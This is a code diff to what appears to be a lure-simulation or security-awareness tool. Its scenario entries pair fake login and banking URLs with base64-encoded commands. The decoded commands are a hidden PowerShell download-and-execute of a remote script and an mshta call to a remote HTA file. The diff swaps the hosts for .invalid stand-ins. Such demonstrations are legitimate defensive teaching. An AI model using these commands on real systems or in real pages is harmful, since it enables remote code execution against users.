@@ -1474,7 +1474,7 @@
       1: {
         name: "Scenario 1: Clipboard Hijack",
         url: "https://victim-portal.invalid/help-desk/login",
-        obfuscated: "cG93ZXJzaGVsbC5leGUgLXcgaGlkZGVuIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZC1hY3Rvci54eXovcC5wczEnKSI=",
+        obfuscated: "cG93ZXJzaGVsbC5leGUgLXcgaGlkZGVuIC1jICJJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL2JhZC1hY3Rvci5pbnZhbGlkL3AucHMxJyki",
         decoded: "powershell.exe -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://bad-actor.invalid/p.ps1')\"",
         lureHtml: `
           <svg class="lure-logo" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2">
@@ -1501,7 +1501,7 @@
       2: {
         name: "Scenario 2: Captcha DOM Lure",
         url: "https://legit-banking.invalid/personal",
-        obfuscated: "bXNodGEgImh0dHA6Ly9jbGVhcmZha2UtZG9tYWluLmluZm8vdXBkYXRlLmh0YSI=",
+        obfuscated: "bXNodGEgImh0dHA6Ly9jbGVhcmZha2UtZG9tYWluLmludmFsaWQvdXBkYXRlLmh0YSI=",
         decoded: "mshta \"http://clearfake-domain.invalid/update.hta\"",
         lureHtml: `
           <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 0.75rem; text-align: left; width: 100%;">
